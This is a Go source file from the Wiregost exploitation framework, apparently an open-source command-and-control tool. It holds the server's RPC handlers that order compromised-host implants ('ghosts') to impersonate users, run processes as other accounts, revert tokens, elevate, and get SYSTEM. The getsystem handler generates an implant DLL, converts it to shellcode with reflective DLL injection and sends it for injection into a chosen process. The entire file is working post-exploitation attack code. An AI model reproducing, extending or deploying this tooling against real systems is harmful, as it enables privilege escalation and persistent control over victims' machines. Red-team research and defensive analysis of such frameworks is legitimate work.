// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package rpc

import (
	"fmt"
	"time"

	"github.com/golang/protobuf/proto"

	clientpb "github.com/maxlandon/wiregost/protobuf/client"
	ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
	"github.com/maxlandon/wiregost/server/core"
	"github.com/maxlandon/wiregost/server/generate"
)

func rpcImpersonate(req []byte, timeout time.Duration, resp RPCResponse) {
	impersonateReq := &ghostpb.ImpersonateReq{}
	err := proto.Unmarshal(req, impersonateReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	ghost := core.Wire.Ghost(impersonateReq.GhostID)
	if ghost == nil {
		resp([]byte{}, fmt.Errorf("Could not find ghost"))
		return
	}
	data, _ := proto.Marshal(&ghostpb.ImpersonateReq{
		Username: impersonateReq.Username,
	})

	data, err = ghost.Request(ghostpb.MsgImpersonateReq, timeout, data)
	resp(data, err)
}

func rpcRunAs(req []byte, timeout time.Duration, resp RPCResponse) {
	runAsReq := &ghostpb.RunAsReq{}
	err := proto.Unmarshal(req, runAsReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	ghost := core.Wire.Ghost(runAsReq.GhostID)
	if ghost == nil {
		resp([]byte{}, fmt.Errorf("Could not find ghost"))
		return
	}
	data, _ := proto.Marshal(&ghostpb.RunAsReq{
		Process:  runAsReq.Process,
		Username: runAsReq.Username,
		Args:     runAsReq.Args,
	})

	data, err = ghost.Request(ghostpb.MsgRunAs, timeout, data)
	resp(data, err)
}

func rpcRevToSelf(req []byte, timeout time.Duration, resp RPCResponse) {
	rst := &ghostpb.RevToSelfReq{}
	err := proto.Unmarshal(req, rst)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	ghost := core.Wire.Ghost(rst.GhostID)
	if ghost == nil {
		resp([]byte{}, fmt.Errorf("Could not find ghost"))
		return
	}
	data, _ := proto.Marshal(&ghostpb.RevToSelfReq{
		GhostID: ghost.ID,
	})
	data, err = ghost.Request(ghostpb.MsgRevToSelf, timeout, data)
	resp(data, err)
}

func rpcGetSystem(req []byte, timeout time.Duration, resp RPCResponse) {
	gsReq := &clientpb.GetSystemReq{}
	err := proto.Unmarshal(req, gsReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	ghost := core.Wire.Ghost(gsReq.GhostID)
	if ghost == nil {
		resp([]byte{}, fmt.Errorf("Could not find ghost"))
		return
	}
	config := generate.GhostConfigFromProtobuf(gsReq.Config)
	config.Format = clientpb.GhostConfig_SHARED_LIB
	config.ObfuscateSymbols = false
	dllPath, err := generate.GhostSharedLibrary(config)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
	if err != nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&ghostpb.GetSystemReq{
		Data:           shellcode,
		HostingProcess: gsReq.HostingProcess,
		GhostID:        gsReq.GhostID,
	})

	data, err = ghost.Request(ghostpb.MsgGetSystemReq, timeout, data)
	resp(data, err)
}

func rpcElevate(req []byte, timeout time.Duration, resp RPCResponse) {
	elevateReq := &ghostpb.ElevateReq{}
	err := proto.Unmarshal(req, elevateReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	ghost := core.Wire.Ghost(elevateReq.GhostID)
	if ghost == nil {
		resp([]byte{}, fmt.Errorf("Could not find ghost"))
		return
	}
	data, _ := proto.Marshal(&ghostpb.ElevateReq{})

	data, err = ghost.Request(ghostpb.MsgElevateReq, timeout, data)
	resp(data, err)

}
